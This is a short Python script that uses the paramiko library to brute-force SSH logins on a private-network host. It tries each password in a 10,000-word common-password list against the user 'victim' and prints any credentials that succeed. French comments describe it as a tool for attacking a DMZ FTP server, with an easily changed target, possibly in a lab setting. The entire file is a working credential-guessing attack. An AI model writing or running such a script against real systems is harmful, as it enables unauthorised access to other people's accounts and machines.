import paramiko
import time

# Ce script est fait pour attaquer le dmz ftp mais la victime peut changer, il suffit de modif target_ip.

target_ip = "10.12.0.10"
username = "victim"
wordlist_path = "10k-most-common.txt"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open(wordlist_path, "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        try:
            print(f"Trying {username}:{password}")
            ssh.connect(target_ip, port=22, username=username, password=password, timeout=5)
            print(f"FOUND: {username}:{password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print(f"Failed: {password}")
        except paramiko.ssh_exception.SSHException as e:
            print(f"SSH Error (possible timeout or reset): {e}")
            # on attend si on est déco du serveur 
            time.sleep(5)  
            continue
        except Exception as e:
            print(f"Other error: {e}")
            break
        time.sleep(3) 

